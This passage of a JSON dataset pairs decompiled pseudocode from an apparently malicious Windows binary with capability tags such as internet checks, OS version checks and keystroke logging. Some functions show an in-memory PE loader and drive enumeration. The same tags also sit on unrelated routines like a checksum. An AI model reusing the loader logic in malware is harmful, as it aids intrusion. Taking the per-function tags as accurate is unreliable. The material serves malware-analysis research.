            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045a570(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != *(*(in_EAX + 0x1c) + 100)) {\n        in_EAX = *(in_EAX + 0x14);\n    }\n    if (*(in_EAX + 0x10) != '\\x01') {\n        if (*(in_EAX + 0x10) == '\\x02') {\n            fcn.0045a600();\n        }\n        else {\n            fcn.0040dafc();\n            fcn.00404ec4();\n        }\n        return;\n    }\n    fcn.0045a600();\n    return;\n}\n",
        "token_count": 150
    },
    "0045a5b8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045a5b8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != *(*(in_EAX + 0x1c) + 100)) {\n        in_EAX = *(in_EAX + 0x14);\n    }\n    if (*(in_EAX + 0x10) != '\\x01') {\n        if (*(in_EAX + 0x10) == '\\x02') {\n            fcn.0045a684();\n        }\n        else {\n            fcn.0040dafc();\n            fcn.00404ec4();\n        }\n        return;\n    }\n    fcn.0045a684();\n    return;\n}\n",
        "token_count": 152
    },
    "0045ab68": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045ab68(int32_t param_1, char param_2)\n\n{\n    uchar uVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_ch;\n    uint var_5h;\n    \n    if (param_2 != '\\0') {\n        puStack48 = 0x45ab7d;\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n    }\n    puStack48 = 0x45ab90;\n    fcn.00404620();\n    in_EAX[3] = 4;\n    in_EAX[5] = param_1;\n    in_EAX[0x1c] = 0x80000;\n    in_EAX[6] = 0xc;\n    if ((*(param_1 + 0x5b) == '\\x01') || (*(param_1 + 0x5b) == '\\x02')) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 1;\n    }\n    *(in_EAX + 7) = uVar1;\n    puStack48 = 0x45abe1;\n    iVar2 = fcn.0045a4dc();\n    in_EAX[0x19] = iVar2;\n    puStack48 = 0x45abf3;\n    iVar2 = fcn.00424e10();\n    in_EAX[4] = iVar2;\n    puStack48 = 0x45ac07;\n    fcn.0042b908();\n    puStack48 = 0x45ac10;\n    fcn.00424f8c();\n    puStack48 = 0x45ac18;\n    fcn.0045ad3c();\n    uStack52 = 0x45ac75;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    iVar2 = fcn.004546e8();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.004546ac(0);\n            (**(*in_EAX + 0xc))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.0045a73c();\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x45ac7c;\n    uStack52 = 0x45ac74;\n    fcn.0045ad40();\n    return;\n}\n",
        "token_count": 602
    },
    "0045c86c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045c86c(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.0045d63c();\n    fcn.0045c934();\n    sub.user32.dll_ReleaseDC(*(in_EAX + 0x5c), *(in_EAX + 0x58));\n    if (*(*(*(in_EAX + 0x60) + 0x14) + 0x10) == '\\x01') {\n        fcn.0045aa80();\n    }\n    else {\n        fcn.0045aa80();\n    }\n    fcn.0045c790();\n    fcn.0045ae14(0x45c910);\n    *(in_EAX + 0x60) = 0;\n    return;\n}\n",
        "token_count": 169
    },
    "0045c934": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045c934(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    \n    if (*(in_EAX + 0x60) != 0) {\n        if (*(*(*(in_EAX + 0x60) + 0x14) + 0x10) == '\\x01') {\n            iVar1 = fcn.0045a600();\n            iVar2 = *(in_EAX + 0xc) >> 1;\n            if (iVar2 < 0) {\n                iVar2 = iVar2 + ((*(in_EAX + 0xc) & 1) != 0);\n            }\n            iVar2 = *(in_EAX + 0x54) - iVar2;\n            iVar3 = fcn.0045a684(iVar1, iVar2);\n            iVar3 = iVar3 + iVar1;\n            iVar4 = iVar2 + *(in_EAX + 0xc);\n        }\n        else {\n            iVar1 = *(in_EAX + 0xc) >> 1;\n            if (iVar1 < 0) {\n                iVar1 = iVar1 + ((*(in_EAX + 0xc) & 1) != 0);\n            }\n            iVar1 = *(in_EAX + 0x50) - iVar1;\n            iVar2 = fcn.0045a600(iVar1);\n            iVar3 = iVar1 + *(in_EAX + 0xc);\n            iVar4 = fcn.0045a684(iVar1, iVar2, iVar3);\n            iVar4 = iVar4 + iVar2;\n        }\n        iVar4 = fcn.00424fec(iVar1, iVar2, iVar3, iVar4);\n        iVar3 = *(in_EAX + 0x58);\n        uVar5 = sub.gdi32.dll_SelectObject(iVar3, iVar4);\n        sub.gdi32.dll_PatBlt(*(in_EAX + 0x58), iVar3, iVar4, iVar1 - iVar3, iVar2 - iVar4, 0x5a0049);\n        sub.gdi32.dll_SelectObject(*(in_EAX + 0x58), uVar5);\n    }\n    return;\n}\n",
        "token_count": 503
    },
    "0045d24c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045d24c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    piVar3 = arg_8h + -4;\n    iVar1 = *(*piVar3 + 0x18);\n    if (*(*(*(*piVar3 + 0x60) + 0x14) + 0x10) == '\\x01') {\n        iVar2 = fcn.0045a600();\n        if (*(*piVar3 + 0x54) <= iVar2 + iVar1) {\n            *(*piVar3 + 0x54) = iVar2 + iVar1;\n        }\n        iVar2 = fcn.0045cab0();\n        if (iVar2 - iVar1 <= *(*piVar3 + 0x54)) {\n            *(*piVar3 + 0x54) = iVar2 - iVar1;\n        }\n    }\n    else {\n        iVar2 = fcn.0045a600();\n        if (*(*piVar3 + 0x50) <= iVar2 + iVar1) {\n            *(*piVar3 + 0x50) = iVar2 + iVar1;\n        }\n        iVar2 = fcn.0045cab0();\n        if (iVar2 - iVar1 <= *(*piVar3 + 0x50)) {\n            *(*piVar3 + 0x50) = iVar2 - iVar1;\n        }\n    }\n    return;\n}\n",
        "token_count": 326
    },
    "0045d494": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0045d494(uint param_1, char param_2)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 4) = 1;\n    *(in_EAX + 8) = 5;\n    if (((**0x494d14 == 2) && (3 < **0x494958)) ||\n       ((**0x494d14 == 1 && ((4 < **0x494958 || ((**0x494958 == 4 && (9 < **0x494b88)))))))) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = 0;\n    }\n    *(in_EAX + 0xd) = uVar1;\n    fcn.0045d684();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 278
    },
    "0045d5c8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045d5c8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = (***0x494970)(0x13);\n    *(in_EAX + 0xc) = '\\x01' - (iVar1 == 0);\n    return;\n}\n",
        "token_count": 72
    },
    "0045d5e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045d5e4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char cVar2;\n    \n    iVar1 = (***0x494970)(0x4b);\n    cVar2 = '\\x01' - (iVar1 == 0);\n    *(in_EAX + 0x20) = cVar2;\n    if (cVar2 != '\\0') {\n        sub.user32.dll_SystemParametersInfoA(0x68, 0, in_EAX + 0x10, 0);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "004640a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004640a0(int32_t param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 9) = 0;\n    *(in_EAX + 8) = 0;\n    *(in_EAX + 0x24) = 0;\n    *(in_EAX + 0x18) = 0;\n    *(in_EAX + 0x1c) = 0;\n    *(in_EAX + 0x20) = 0;\n    if (param_1 == 0) {\n        param_1 = 1;\n    }\n    *(in_EAX + 0x30) = param_1;\n    fcn.00406928(param_1);\n    fcn.00464020();\n    *(in_EAX + 0x38) = 0x696;\n    *(in_EAX + 0x40) = 0;\n    *(in_EAX + 0x44) = 0;\n    *(in_EAX + 10) = 0;\n    uVar1 = fcn.00421140(fcn.00463f64, in_EAX);\n    *(in_EAX + 0x34) = uVar1;\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x1c4c) = uVar1;\n    uVar2 = 0;\n    uVar1 = fcn.0042edbc(0, 0x46417c, 0, 0);\n    *(in_EAX + 0x1c50) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 486
    },
    "00465a0c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.00465a0c(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t *arg_8h;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar6;\n    int32_t *piVar7;\n    int32_t *piVar8;\n    int32_t *in_stack_fffffe7c;\n    int32_t *piStack348;\n    uint uStack344;\n    uchar *puStack340;\n    int32_t var_140h;\n    uint32_t lpAddress;\n    uint dwSize;\n    uint var_ech;\n    uint var_48h;\n    int32_t *var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack340 = &stack0xfffffffc;\n    var_4h = NULL;\n    uStack344 = 0x465c87;\n    piStack348 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack348;\n    fcn.00408560();\n    if (var_48h == 0x5a4d) {\n        piVar6 = var_ch;\n        fcn.004652b4(var_ch, var_ch >> 0x1f);\n        fcn.00408560();\n        if (var_140h == 0x4550) {\n            uVar2 = sub.kernel32.dll_VirtualAlloc_1(lpAddress, dwSize, 0x2000, 4);\n            if (uVar2 == 0) {\n                in_stack_fffffe7c = NULL;\n                uVar2 = sub.kernel32.dll_VirtualAlloc_1(0, dwSize, 0x2000, 4);\n            }\n            if (uVar2 == 0) {\n                fcn.00405584();\n                *in_FS_OFFSET = in_stack_fffffe7c;\n            }\n            else {\n                uVar3 = sub.kernel32.dll_GetProcessHeap(0, 0x11);\n                arg_8h = sub.kernel32.dll_HeapAlloc(uVar3);\n                arg_8h[1] = uVar2;\n                arg_8h[3] = 0;\n                arg_8h[2] = 0;\n                *(arg_8h + 4) = 0;\n                sub.kernel32.dll_VirtualAlloc_1(uVar2, dwSize, 0x1000, 4);\n                iVar4 = sub.kernel32.dll_VirtualAlloc_1(uVar2, var_ech, 0x1000, 4);\n                fcn.00408560();\n                *arg_8h = var_ch + iVar4;\n                *(var_ch + iVar4 + 0x34) = uVar2;\n                fcn.004653a8();\n                piVar6 = uVar2 - lpAddress;\n                piVar7 = piVar6;\n                piVar8 = -(uVar2 < lpAddress);\n                if (piVar6 != NULL) {\n                    piVar7 = arg_8h;\n                    fcn.004654ac(arg_8h, piVar6);\n                    piVar8 = piVar6;\n                }\n                piVar6 = arg_8h;\n                cVar1 = fcn.00465598(arg_8h);\n                if (cVar1 == '\\0') {\n                    fcn.00405818(piVar6, piVar7, piVar8);\n                    fcn.00466038();\n                    *in_FS_OFFSET = piVar6;\n                }\n                else {\n                    piVar6 = arg_8h;\n                    fcn.004658f4(arg_8h);\n                    if (*(*arg_8h + 0x28) != 0) {\n                        pcVar5 = *(*arg_8h + 0x28) + uVar2;\n                        if (pcVar5 == NULL) {\n                            fcn.00405584();\n                            fcn.00466038();\n                            *in_FS_OFFSET = piVar6;\n                            return NULL;\n                        }\n                        iVar4 = (*pcVar5)(uVar2, 1, 0);\n                        if (iVar4 == 0) {\n                            fcn.00405584();\n                            fcn.00466038();\n                            *in_FS_OFFSET = piVar6;\n                            return NULL;\n                        }\n                        *(arg_8h + 4) = 1;\n                    }\n                    *in_FS_OFFSET = piVar6;\n                    var_4h = arg_8h;\n                }\n            }\n        }\n        else {\n            fcn.00405584();\n            *in_FS_OFFSET = piVar6;\n        }\n    }\n    else {\n        fcn.00405584();\n        *in_FS_OFFSET = piStack348;\n    }\n    return var_4h;\n}\n",
        "token_count": 1066
    },
    "00466cdc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00466cdc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iStack300;\n    \n    iVar1 = fcn.00460d3c();\n    if ((iVar1 != -1) && (iVar1 = fcn.00460d5c(0x128),  iVar1 != 0)) {\n        while (iVar1 = fcn.00460d7c(),  iVar1 != 0) {\n            if (in_EAX == iStack300) {\n                fcn.004057a0();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 137
    },
    "0046797c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0046797c(uint32_t param_1, uint8_t *param_2)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    int32_t iVar17;\n    uint32_t uVar18;\n    \n    uVar18 = in_EAX >> 0x10;\n    uVar2 = in_EAX & 0xffff;\n    if (param_1 == 1) {\n        uVar2 = uVar2 + *param_2;\n        if (0xfff0 < uVar2) {\n            uVar2 = uVar2 - 0xfff1;\n        }\n        uVar18 = uVar18 + uVar2;\n        if (0xfff0 < uVar18) {\n            uVar18 = uVar18 - 0xfff1;\n        }\n        uVar2 = uVar18 << 0x10 | uVar2;\n    }\n    else if (param_2 == NULL) {\n        uVar2 = 1;\n    }\n    else if (param_1 < 0x10) {\n        while (param_1 != 0) {\n            uVar2 = uVar2 + *param_2;\n            param_2 = param_2 + 1;\n            uVar18 = uVar18 + uVar2;\n            param_1 = param_1 - 1;\n        }\n        if (0xfff0 < uVar2) {\n            uVar2 = uVar2 - 0xfff1;\n        }\n        uVar2 = uVar18 % 0xfff1 << 0x10 | uVar2;\n    }\n    else {\n        if (0x15af < param_1) {\n            do {\n                param_1 = param_1 - 0x15b0;\n                iVar1 = 0x15b;\n                do {\n                    iVar3 = uVar2 + *param_2;\n                    iVar4 = iVar3 + param_2[1];\n                    iVar5 = iVar4 + param_2[2];\n                    iVar6 = iVar5 + param_2[3];\n                    iVar7 = iVar6 + param_2[4];\n                    iVar8 = iVar7 + param_2[5];\n                    iVar9 = iVar8 + param_2[6];\n                    iVar10 = iVar9 + param_2[7];\n                    iVar11 = iVar10 + param_2[8];\n                    iVar12 = iVar11 + param_2[9];\n                    iVar13 = iVar12 + param_2[10];\n                    iVar14 = iVar13 + param_2[0xb];\n                    iVar15 = iVar14 + param_2[0xc];\n                    iVar16 = iVar15 + param_2[0xd];\n                    iVar17 = iVar16 + param_2[0xe];\n                    uVar2 = iVar17 + param_2[0xf];\n                    uVar18 = uVar18 + iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11 + iVar12 +\n                             iVar13 + iVar14 + iVar15 + iVar16 + iVar17 + uVar2;\n                    param_2 = param_2 + 0x10;\n                    iVar1 = iVar1 + -1;\n                } while (iVar1 != 0);\n                uVar2 = uVar2 % 0xfff1;\n                uVar18 = uVar18 % 0xfff1;\n            } while (0x15af < param_1);\n        }\n        if (param_1 != 0) {\n            for (; 0xf < param_1; param_1 = param_1 - 0x10) {\n                iVar1 = uVar2 + *param_2;\n                iVar3 = iVar1 + param_2[1];\n                iVar4 = iVar3 + param_2[2];\n                iVar5 = iVar4 + param_2[3];\n                iVar6 = iVar5 + param_2[4];\n                iVar7 = iVar6 + param_2[5];\n                iVar8 = iVar7 + param_2[6];\n                iVar9 = iVar8 + param_2[7];\n                iVar10 = iVar9 + param_2[8];\n                iVar11 = iVar10 + param_2[9];\n                iVar12 = iVar11 + param_2[10];\n                iVar13 = iVar12 + param_2[0xb];\n                iVar14 = iVar13 + param_2[0xc];\n                iVar15 = iVar14 + param_2[0xd];\n                iVar16 = iVar15 + param_2[0xe];\n                uVar2 = iVar16 + param_2[0xf];\n                uVar18 = uVar18 + iVar1 + iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11 +\n                         iVar12 + iVar13 + iVar14 + iVar15 + iVar16 + uVar2;\n                param_2 = param_2 + 0x10;\n            }\n            while (param_1 != 0) {\n                uVar2 = uVar2 + *param_2;\n                param_2 = param_2 + 1;\n                uVar18 = uVar18 + uVar2;\n                param_1 = param_1 - 1;\n            }\n            uVar2 = uVar2 % 0xfff1;\n            uVar18 = uVar18 % 0xfff1;\n        }\n        uVar2 = uVar18 << 0x10 | uVar2;\n    }\n    return uVar2;\n}\n",
        "token_count": 1303
    },
    "00468750": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00468750(uint32_t param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    uint32_t arg_10h;\n    int32_t iVar1;\n    \n    arg_10h = in_EAX[1];\n    if (param_1 < in_EAX[1]) {\n        arg_10h = param_1;\n    }\n    if (arg_10h == 0) {\n        arg_10h = 0;\n    }\n    else {\n        in_EAX[1] = in_EAX[1] - arg_10h;\n        if (*(in_EAX[7] + 0x18) == 1) {\n            iVar1 = fcn.0046797c();\n            in_EAX[0xc] = iVar1;\n        }\n        fcn.004676d0(param_2, *in_EAX, arg_10h);\n        *in_EAX = *in_EAX + arg_10h;\n        in_EAX[2] = in_EAX[2] + arg_10h;\n    }\n    return arg_10h;\n}\n",
        "token_count": 249
    },
    "0046d070": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0046d097)\n\nint32_t __cdecl fcn.0046d070(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *in_EDX;\n    uint var_3ch;\n    uint var_38h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    iVar1 = fcn.00467c84(0x38);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00468240();\n        if (iVar1 == 1) {\n            *in_EDX = var_28h;\n            iVar1 = fcn.00468504();\n        }\n        else {\n            fcn.00468504();\n            if (iVar1 == 0) {\n                iVar1 = -5;\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 229
    },
    "0046d854": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.0046d854(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    char cVar3;\n    uint unaff_EBX;\n    uint *in_FS_OFFSET;\n    uchar uVar4;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    var_ch = 5;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_20h = 0x46d995;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0046d854::var_24h;\n    cVar3 = 'A';\n    var_10h = unaff_EBX;\n    do {\n        fcn.00405718();\n        fcn.00405818();\n        uVar1 = fcn.004059dc();\n        iVar2 = sub.kernel32.dll_GetDriveTypeA(uVar1);\n        uVar4 = iVar2 == 1;\n        if (1 < iVar2) {\n            fcn.00489d40();\n            fcn.0040a5d4();\n            fcn.00409b7c();\n            var_24h = CONCAT31(CONCAT21(var_24h._2_2_, cVar3), 1);\n            fcn.004039a0(var_10h);\n            fcn.00403970();\n            fcn.00405794();\n            fcn.00409b7c();\n            fcn.00405974();\n            if (uVar4) {\n                fcn.004055c8();\n            }\n            else {\n                fcn.004055c8();\n            }\n            uVar1 = var_4h;\n            fcn.00405718(var_4h);\n            fcn.004058e0(0x46d9dc, var_8h, 0x46d9d0, 0x46d9ac, uVar1);\n        }\n        cVar3 = cVar3 + '\\x01';\n    } while (cVar3 != '[');\n    fcn.00405584();\n    *in_FS_OFFSET = var_24h;\n    var_1ch = 0x46d99c;\n    var_20h = 0x46d987;\n    fcn.00405530();\n    var_20h = 0x46d994;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 695
    },
    "0046da10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0046da10(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.004059dc(0);\n    iVar2 = sub.kernel32.dll_CreateDirectoryA(uVar1);\n    return iVar2 != 0;\n}\n",
        "token_count": 64
    },
    "0046da2c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0046da2c(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.004059dc();\n    uVar1 = fcn.004059dc(uVar1);\n    iVar2 = sub.kernel32.dll_MoveFileA(uVar1);\n    return iVar2 != 0;\n}\n",
        "token_count": 78
    },
    "0046de04": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046de04(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uVar4;\n    uint uStack592;\n    uint uStack588;\n    uchar *puStack584;\n    uint var_234h;\n    uint var_230h;\n    uint var_218h;\n    uint var_110h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack584 = &stack0xfffffffc;\n    uStack588 = 0x46df1d;\n    uStack592 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdb0;\n    fcn.00405530();\n    uVar1 = fcn.00460d3c();\n    iVar2 = fcn.00460d9c();\n    while (iVar2 != 0) {\n        fcn.00409e84();\n        uVar4 = 0;\n        uVar3 = var_218h;\n        fcn.00409eac(var_218h);\n        fcn.004057a0(0, uVar3, uVar4);\n        uStack592 = 0x46df58;\n        fcn.004058e0();\n        iVar2 = fcn.00460dbc();\n    }\n    sub.kernel32.dll_CloseHandle_1();\n    fcn.00405584();\n    *in_FS_OFFSET = uVar1;\n    uStack588 = 0x46df24;\n    uStack592 = 0x46df0f;\n    fcn.00405530();\n    uStack592 = 0x46df1c;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 382
    },
    "0046eab8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __fastcall fcn.0046eab8(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t unaff_EDI;\n    uint *in_FS_OFFSET;\n    uint var_150h;\n    uchar *var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint arg_8h;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    iVar2 = 0x29;\n    do {\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_10h = NULL;\n    puStack36 = 0x46eae0;\n    var_1ch = unaff_EDI;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack36 = 0x46eae8;\n    fcn.004059cc();\n    uStack40 = 0x46ee22;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x46eafe;\n    puStack36 = &stack0xfffffffc;\n    fcn.00405530();\n    puStack48 = 0x46eb0a;\n    var_14h = fcn.004216c4();\n    puStack48 = 0x46eb19;\n    var_18h = fcn.00404620();\n    puStack48 = 0x46eb24;\n    fcn.00409edc();\n    puStack48 = 0x46eb29;\n    fcn.0046e9ac();\n    uStack52 = 0x46ede6;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack64 = 0x46edd5;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack48 = &stack0xfffffffc;\n    fcn.004217a0();\n    fcn.004218e4();\n    fcn.00421ea0();\n    iVar2 = (**(*var_18h + 